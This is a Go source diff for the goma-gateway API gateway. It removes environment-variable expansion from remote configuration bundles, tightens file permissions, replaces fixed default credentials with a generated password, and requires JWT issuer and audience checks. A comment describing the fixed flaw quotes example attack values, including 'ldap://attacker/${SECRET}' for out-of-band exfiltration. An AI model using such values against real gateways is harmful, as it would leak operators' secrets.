@@ -19,6 +19,8 @@ package internal
 
 import (
 	"context"
+	"crypto/rand"
+	"encoding/base64"
 	"fmt"
 	"maps"
 	"os"
@@ -35,6 +37,7 @@ import (
 	"github.com/jkaninda/goma-gateway/util"
 	logger2 "github.com/jkaninda/logger"
 
+	"golang.org/x/crypto/bcrypt"
 	"golang.org/x/oauth2"
 	"golang.org/x/oauth2/amazon"
 	"golang.org/x/oauth2/facebook"
@@ -44,11 +47,26 @@ import (
 	"gopkg.in/yaml.v3"
 )
 
+// Environment-variable expansion happens here and nowhere else.
+//
+// readConfigFile expands the whole file before it is parsed, so every field of
+// a configuration the operator wrote on this host is already substituted by the
+// time it reaches a validate method. Middleware rules used to be expanded a
+// second time, per field — and those methods run for middlewares from *every*
+// source, including remote provider bundles, which are unmarshalled straight
+// from the wire and never see readConfigFile.
+//
+// That gave a hostile or MITM'd bundle a read primitive on the gateway's own
+// environment: a responseHeaders rule whose value is ${GOMA_RELOAD_TOKEN}
+// returned the token on every response, and ldap.url: ldap://attacker/${SECRET}
+// exfiltrated out of band. The per-field expansion was redundant for local
+// configuration and was the only expansion path for remote configuration, so
+// it is gone: file-sourced config still expands, bundle-sourced config does not.
+//
 // readConfigFile reads a declarative configuration file and expands
 // environment-variable references (`${VAR}`) and `{{func()}}` helpers in its
 // contents before it is parsed. This lets any field — hosts, redis.password,
-// certManager.acme.email, … — be sourced from the environment (e.g. a .env
-// file), not just the handful wired to ReplaceEnvVars per field.
+// certManager.acme.email, … — be sourced from the environment (e.g. a .env file).
 //
 // Only the braced `${VAR}` form is substituted, so values that contain a bare
 // `$` (bcrypt hashes like `$2y$05$…`, regex patterns) are left untouched, and
@@ -118,7 +136,9 @@ func (*Goma) Config(configFile string, ctx context.Context) (*Goma, error) {
 	logger.Info("Generating new configuration file...")
 	// check if config Path does exist
 	if !util.FolderExists(ConfigDir) {
-		err := os.MkdirAll(ConfigDir, os.ModePerm)
+		// 0750, not os.ModePerm (0777): this directory holds the gateway
+		// configuration, and anything able to write here can add routes.
+		err := os.MkdirAll(ConfigDir, 0750)
 		if err != nil {
 			return nil, err
 		}
@@ -336,6 +356,10 @@ func initConfig(configFile string) error {
 	if configFile == "" {
 		configFile = GetConfigPaths()
 	}
+	adminPassword, adminHash, err := scaffoldAdminCredentials()
+	if err != nil {
+		return err
+	}
 	conf := &GatewayConfig{
 		Version: version.ConfigVersion,
 		Gateway: Gateway{
@@ -365,7 +389,7 @@ func initConfig(configFile string) error {
 						},
 						ForwardHostHeaders: false,
 					},
-					Middlewares: []string{"block-access"},
+					Middlewares: []string{blockAccessMiddlewareName},
 				},
 				{
 					Name:    "api",
@@ -377,7 +401,7 @@ func initConfig(configFile string) error {
 						&Backend{Endpoint: "https://api-2.example.com", Weight: 20},
 						&Backend{Endpoint: "https://api-3.example.com", Weight: 30},
 					},
-					Middlewares: []string{"basic-auth", "block-access", "block-admin-access"},
+					Middlewares: []string{"basic-auth", blockAccessMiddlewareName, "block-admin-access"},
 				},
 			},
 		},
@@ -391,13 +415,12 @@ func initConfig(configFile string) error {
 				Rule: BasicRuleMiddleware{
 					Realm: "Restricted",
 					Users: []middlewares.User{
-						{Username: "admin", Password: "$2y$05$TIx7l8sJWvMFXw4n0GbkQuOhemPQOormacQC4W1p28TOVzJtx.XpO"},
-						{Username: "user", Password: "password"},
+						{Username: "admin", Password: adminHash},
 					},
 				},
 			},
 			{
-				Name: "block-access",
+				Name: blockAccessMiddlewareName,
 				Type: AccessMiddleware,
 				Paths: []string{
 					"/docs/.*",
@@ -432,11 +455,36 @@ func initConfig(configFile string) error {
 	if err != nil {
 		return fmt.Errorf("serializing configuration %v", err.Error())
 	}
-	err = os.WriteFile(configFile, yamlData, 0644)
+	// 0600, not 0644: a gateway configuration holds basic-auth credentials, JWT
+	// secrets, OIDC client secrets and LDAP bind passwords, and does not belong
+	// to every local process.
+	err = os.WriteFile(configFile, yamlData, 0600)
 	if err != nil {
 		return fmt.Errorf("unable to write config file %s", err)
 	}
+
+	fmt.Printf("Generated a basic-auth user for the example route:\n  username: admin\n  password: %s\nThis password is shown once. Change or remove the middleware before exposing the gateway.\n", adminPassword)
 	return nil
+}
+
+// scaffoldAdminCredentials mints a fresh basic-auth password for `goma config
+// init`.
+//
+// The scaffold used to ship a fixed bcrypt hash committed in this repository
+// alongside a plaintext user:password pair, so every generated configuration
+// had the same working credentials in front of it.
+func scaffoldAdminCredentials() (plain string, hash string, err error) {
+	raw := make([]byte, 18)
+	if _, err = rand.Read(raw); err != nil {
+		return "", "", fmt.Errorf("generating an initial password: %w", err)
+	}
+	plain = base64.RawURLEncoding.EncodeToString(raw)
+
+	hashed, err := bcrypt.GenerateFromPassword([]byte(plain), bcrypt.DefaultCost)
+	if err != nil {
+		return "", "", fmt.Errorf("hashing the initial password: %w", err)
+	}
+	return plain, string(hashed), nil
 }
 func (g *Gateway) Setup(conf string) *Gateway {
 	if util.FileExists(conf) {
@@ -470,6 +518,20 @@ func (jwt JWTRuleMiddleware) validate() error {
 	if jwt.Secret == "" && jwt.PublicKey == "" && jwt.JwksUrl == "" && jwt.JwksFile == "" {
 		return fmt.Errorf("empty Secret, JwksUrl, JwksFile or  PublicKey in jwt auth middlewares")
 
+	}
+	// An empty issuer or audience disables that check entirely rather than
+	// failing it. With an identity-provider key source that means every token
+	// the provider ever signed — for any tenant, any client — is accepted, so
+	// both expectations are required there.
+	if jwt.JwksUrl != "" || jwt.JwksFile != "" || jwt.PublicKey != "" {
+		if jwt.Issuer == "" {
+			return fmt.Errorf("empty issuer in jwt auth middleware: an issuer is required when the key comes from jwksUrl, jwksFile or publicKey")
+		}
+		if jwt.Audience == "" {
+			return fmt.Errorf("empty audience in jwt auth middleware: an audience is required when the key comes from jwksUrl, jwksFile or publicKey")
+		}
+	} else if jwt.Issuer == "" {
+		logger.Warn("JWT middleware has no issuer configured, the issuer claim will not be checked")
 	}
 	return nil
 }
@@ -556,10 +618,6 @@ func (basicAuth *BasicRuleMiddleware) validate() error {
 			return fmt.Errorf("empty username or password in basic auth middlewares")
 		}
 	}
-	for index, user := range basicAuth.Users {
-		basicAuth.Users[index].Username = goutils.ReplaceEnvVars(user.Username)
-		basicAuth.Users[index].Password = goutils.ReplaceEnvVars(user.Password)
-	}
 	return nil
 }
 func (l *LdapRuleMiddleware) validate() error {
@@ -569,12 +627,6 @@ func (l *LdapRuleMiddleware) validate() error {
 	if l.BaseDN == "" {
 		return fmt.Errorf("LDAP BaseDN is required")
 	}
-	// ReplaceEnvVars
-	l.URL = goutils.ReplaceEnvVars(l.URL)
-	l.BaseDN = goutils.ReplaceEnvVars(l.BaseDN)
-	l.BindDN = goutils.ReplaceEnvVars(l.BindDN)
-	l.BindPass = goutils.ReplaceEnvVars(l.BindPass)
-	l.UserFilter = goutils.ReplaceEnvVars(l.UserFilter)
 	return nil
 }
 func (a AccessPolicyRuleMiddleware) validate() error {
@@ -605,12 +657,10 @@ func (a *ResponseHeader) resolveHeaderValue(value string, route *Route) string {
 		return value
 	}
 
-	// Replace context variables
-	resolved := a.replaceContextVariables(value, route)
-
-	// Replace environment variables
-	resolved = goutils.ReplaceEnvVars(resolved)
-	return resolved
+	// Route and gateway context variables only: environment variables are
+	// expanded once, in readConfigFile, and deliberately not for configuration
+	// that arrived from a provider bundle.
+	return a.replaceContextVariables(value, route)
 }
 
 // replaceContextVariables replaces route and gateway context variables
@@ -725,9 +775,6 @@ func (a *ResponseHeader) validateCookies() error {
 			return fmt.Errorf("cookie name '%s' contains invalid characters", cookie.Name)
 		}
 
-		// Replace environment variables in value
-		a.SetCookies[i].Value = goutils.ReplaceEnvVars(cookie.Value)
-
 		// Validate cookie value doesn't contain invalid characters (unless it's a removal)
 		if cookie.Value != "" && strings.ContainsAny(cookie.Value, "\r\n;,") {
 			return fmt.Errorf("cookie '%s' value contains invalid characters", cookie.Name)
@@ -775,9 +822,6 @@ func (a *ResponseHeader) validateCacheControl() error {
 	if strings.ContainsAny(a.CacheControl, "\r\n") {
 		return fmt.Errorf("cacheControl contains invalid characters")
 	}
-
-	// Replace environment variables
-	a.CacheControl = goutils.ReplaceEnvVars(a.CacheControl)
 
 	// Validate cache statuses
 	for _, status := range a.CacheStatuses {
